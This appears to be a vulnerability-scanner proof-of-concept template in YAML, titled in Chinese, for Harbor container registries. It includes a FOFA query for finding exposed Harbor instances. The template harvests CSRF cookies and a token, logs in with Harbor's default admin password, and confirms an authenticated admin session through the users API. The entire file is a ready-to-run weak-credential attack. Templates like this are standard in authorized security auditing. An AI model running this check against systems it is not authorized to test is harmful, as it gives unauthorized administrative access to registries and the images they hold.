id: poc-yaml-harbor-weak-password
info:
  name: Harbor 弱口令漏洞
  severity: high
  tags:
  - 弱口令
  finger: harbor
  fofa: app="HARBOR"
requests:
- method: GET
  path: /c/login
  expression: contains(headers,"Csrf")
  output:
  - regex_match(headers,"sid=(?P<cookie1>.*?);")
  - regex_match(headers,"_gorilla_csrf=(?P<cookie2>.*?);")
  - regex_match(headers,"X-Harbor-Csrf-Token\x3a (?P<token>.*?)\r\n")
- method: POST
  path: /c/login
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: sid={{.cookie1}}; _gorilla_csrf={{.cookie2}}
    X-Harbor-Csrf-Token: '{{.token}}'
  data: principal=admin&password=Harbor12345
  expression: status_code == 200 && body == ""
  output:
  - regex_match(headers,"sid=(?P<cookie3>.*?);")
- method: GET
  path: /api/v2.0/users/current
  headers:
    Cookie: _gorilla_csrf={{.cookie2}}; sid={{.cookie3}}
  expression: status_code == 200 && contains(body,"\"comment\":") && contains(body,"\"username\":\"admin\"")
    && contains(content_type,"application/json")
variables: {}
transport: http
